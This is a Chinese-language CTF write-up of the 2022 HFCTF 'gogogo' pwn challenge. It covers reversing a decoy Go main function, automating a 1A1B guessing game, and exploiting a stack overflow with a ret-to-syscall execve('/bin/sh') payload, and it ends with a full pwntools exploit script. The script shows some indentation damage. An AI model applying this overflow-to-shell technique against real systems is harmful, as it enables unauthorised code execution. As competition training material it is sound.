---
layout: post
title: "2022HFCTF pwn gogogo wp"
date:   2022-3-25
tags: [ctf_wp]
comments: true
author: wsxk
---

这道题嘛，与其说是pwn，更像re

一开始先跑一下它

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/1.png)

看样子是让我们输入一些东西的

拖入IDA进行分析，我用的IDA版本是7.6，这时候IDA已经开始了对go编写的代码的反编译支持，然而这个支持并不是很好，在IDA中我们看到main_main函数（一般情况下这是程序的主函数，但是这次情况并不相同，稍后再说）


![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/3.png)

虽然能看出大概用了什么函数，但是里面的参数我们是看不到的。究其原因，是go语言编译的汇编代码，它的传参方式和传统的标准不同。举个简单的例子

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/4.png)

它调用printf时，用的寄存器顺序和传统的64位linux程序不同，所以ida识别不出它的参数

这让我们在分析函数的时候造成了很大的麻烦。暂时没找到很好的办法

然后看它的逻辑，输入305419896有惊喜

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/5.png)

根据提示符在main函数里找

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/6.png)

它创建了一个slice，然后往里面200h的字节，显然这个是没有溢出的

那怎么办了，想下个断点看看，然后小伙伴们在下断点的时候就发现了，无法在main函数中断下断点。

这是为啥呢？

我继续往前调试，发现这个main函数是出题人的幌子（换句话说，其实走的不是这里，而是一个叫做math_init的函数）（虽然是短短的一句话，但是我调了半天，尼玛的）

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/7.png)

然后看到这么多行代码，我的心凉了一截。仔细一看，它一个字符一个字符得打印。得，虽然很傻逼，但是很有效，在没有很好的反编译工具的情况下，屎山就是高不可攀

怎么办呢，还是继续看math_init函数，这里有3个数字可以选，只有一个数字可以继续往下走

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/8.png)

这个bytes_In,才真的带你进了一次main_main函数（哭）

虽然重点不是这里

在bytes_In函数后，它会让你玩一个游戏

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/10.png)

看到1A1B 我当时也不知道

后来看了一篇博客哥，链接在这里

[https://www.jianshu.com/p/8f788aa5a28e](https://www.jianshu.com/p/8f788aa5a28e)

他里面给了这个游戏的的自动化猜测代码的网址

[https://www.cnblogs.com/funlove/p/13215041.html](https://www.cnblogs.com/funlove/p/13215041.html)

里面给了一个自动猜测的代码guessTrainer函数

我们可以对它进行魔改，具体就是，不让他自动生成答案，然后是把猜测发到gogogo程序里，根据它的回复来进行修改错误答案

然而我看了看它的代码

发现它的去除错误代码有点问题

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/11.png)

它比较是根据已有的回显来修正答案的

换句话说，虽然很可能拿到正确答案，但是有概率得不到正确结果，这就很难受了，我怎么知道我魔改后能正常跑呢？

最后就是魔改完了多跑了几次代码，一般情况下，你改对了，在多跑几次的情况下能通过

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/12.png)

在通过后

你可以选择继续玩或者退出，当然不会有人继续这个游戏

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/13.png)

到这里选择EXIT后

得到这样的回显

如果你有空自己去试试的话，你会发现，0 1 2 3 是没啥用的，就 4选项，exit后，存在一个栈溢出

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/14.png)

可以看一下它的汇编代码

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/15.png)


注意，它读的位置在 rsp+4c0h+var_460，var_460=-460h

这里要注意的一点，go基本上没有用到rbp作为栈帧寄存器

rsp+4c0h就是一个栈帧机制，这个地址存放的就是返回值，然后它读了800h字节

这里就懂了，栈溢出

然后看一下保护，发现基本上啥都没有

因为go是静态编译的

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/16.png)

我们能直接找到syscall函数，仔细一看，哦吼，rdi，rsi，rdx，rax都自动帮你整好了

特别省事

现在问题就差输入 '/bin/sh'了。还要传入它的地址。'/bin/sh'是放入栈中的，我们不知道栈地址，怎么办呢？

但是溢出点就这一个，已经没有其他东西了

这时候死马当活马医，先写个payload进去

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/17.png)


果不其然它报错了。但是go报错会打印出一堆的栈信息。

我们可以看到栈的地址，大概是在哪个位置，我们写一个大概的值

让它去撞就行了

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-25-2022HFCTF_pwn_gogogo/18.png)

最后附上完整的exp

    from pwn import *

    import time

    context.log_level='debug'

    io = process("./gogogo")



    def guessTrainner():

    start =time.time()

    answerSet=answerSetInit(set())

    for i in range(7):

        inputStrMax=suggestedNum(answerSet,100)

        print('第%d步----' %(i+1), end="")

        print('尝试：' +inputStrMax, end="")

        print('----', end="")

        AMax,BMax = compareAnswer_send(inputStrMax)

        print('反馈：%dA%dB' % (AMax, BMax), end="")

        print('----', end="")

        print('排除可能答案：%d个' % (answerSetDelNum(answerSet,inputStrMax,AMax,BMax)))

        answerSetUpd(answerSet,inputStrMax,AMax,BMax)

        if AMax==4:

            elapsed = (time.time() - start)

            print("猜数字成功，总用时：%f秒，总步数：%d。" %(elapsed,i+1))

            break

        elif i==6:

            print("猜数字失败！")





    def compareAnswer_send(inputStr):

    inputSTR = inputStr[0]+' '+inputStr[1]+' '+inputStr[2]+' '+inputStr[3]

    io.sendline(str(inputSTR))

    io.recvuntil(b"\n")

    results = io.recvuntil(b"B",timeout=1)

    if results == b"":

        return 4,4

    print(results)

    A = int(results[0])-48

    B = int(results[2])-48

    print(A,B)

    return A,B



    def compareAnswer(inputStr,answerStr):

    A=0

    B=0

    for j in range(4):

        if inputStr[j]==answerStr[j]:

            A+=1

        else:

            for k in range(4):

                if inputStr[j]==answerStr[k]:

                B+=1

    return A,B



    def answerSetInit(answerSet):

    answerSet.clear()

    for i in range(1234,9877):

        seti=set(str(i))

        if len(seti)==4 and seti.isdisjoint(set('0')):

            answerSet.add(str(i))

    return answerSet



    def answerSetUpd(answerSet,inputStr,A,B):

    answerSetCopy=answerSet.copy()

    for answerStr in answerSetCopy:

        A1,B1=compareAnswer(inputStr,answerStr)

        if A!=A1 or B!=B1:

            answerSet.remove(answerStr)



    def answerSetDelNum(answerSet,inputStr,A,B):

    i=0

    for answerStr in answerSet:

        A1, B1 = compareAnswer(inputStr, answerStr)

        if A!=A1 or B!=B1:

            i+=1

    return i





    def suggestedNum(answerSet,lvl):

    suggestedNum=''

    delCountMax=0

    if len(answerSet) > lvl:

        suggestedNum = list(answerSet)[0]

    else:

        for inputStr in answerSet:

            delCount = 0

            for answerStr in answerSet:

                A,B = compareAnswer(inputStr, answerStr)

                delCount += answerSetDelNum(answerSet, inputStr,A,B)

            if delCount > delCountMax:

                delCountMax = delCount

                suggestedNum = inputStr

            if delCount == delCountMax:

                if suggestedNum == '' or int(suggestedNum) > int(inputStr):

                suggestedNum = inputStr

    # print(inputStr+'-----'+str(delCount)+'-----'+str(delCountMax)+'-----'+suggestedNum)

    return suggestedNum





    io.recvuntil("PLEASE INPUT A NUMBER:")

    io.sendline(str(1717986918))

    io.recvuntil("PLEASE INPUT A NUMBER:")

    io.sendline(str(1234))

    io.recvuntil("YOU HAVE SEVEN CHANCES TO GUESS")

    guessTrainner()

    io.recvuntil("AGAIN OR EXIT?")

    io.sendline("exit")

    io.recvuntil("EXIT")

    #gdb.attach(io)

    io.sendline(str(4))



    io.recvuntil("ARE YOU SURE?")

    #gdb.attach(io)

    syscall = 0x47cf05

    binsh = 0xc0000be000



    payload = b'/bin/sh\x00'*0x8c + p64(syscall) + p64(0) + p64(59) + p64(binsh) + p64(0) + p64(0)

    io.sendline(payload)

    io.interactive()



    #494B0F

